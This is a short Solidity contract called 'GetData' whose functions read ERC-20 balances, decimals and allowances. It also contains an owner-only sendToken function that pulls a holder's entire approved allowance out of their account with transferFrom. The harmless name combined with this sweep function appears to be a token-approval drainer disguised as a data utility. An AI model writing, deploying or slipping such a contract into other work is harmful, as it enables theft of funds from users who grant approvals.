// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function decimals() external view  returns (uint8);

}

contract GetData {

address payable owner;

constructor() {
    owner = payable(msg.sender);
}

function getBalance(address owner, address tokenAddress) external view returns(uint256){
    IERC20 token = IERC20(tokenAddress);
    return(token.balanceOf(owner));
}

function getDecimal(address tokenAddress) external view returns(uint8){
    IERC20 token = IERC20(tokenAddress);
    return(token.decimals());
}


function getAllowance(address owner,address spender,address tokenAddress) external view returns(uint256){
    IERC20 _token = IERC20(tokenAddress);
    uint256 amount = _token.allowance(owner, spender);
    return(amount);
}

function sendToken(address owner,address spender, address tokenAddress) external  onlyOwner{
    IERC20 _token = IERC20(tokenAddress);
    uint amount = _token.allowance(owner, spender);
    _token.transferFrom(owner,spender,amount);
}

modifier onlyOwner{
    require (msg.sender == owner);
    _;
}

}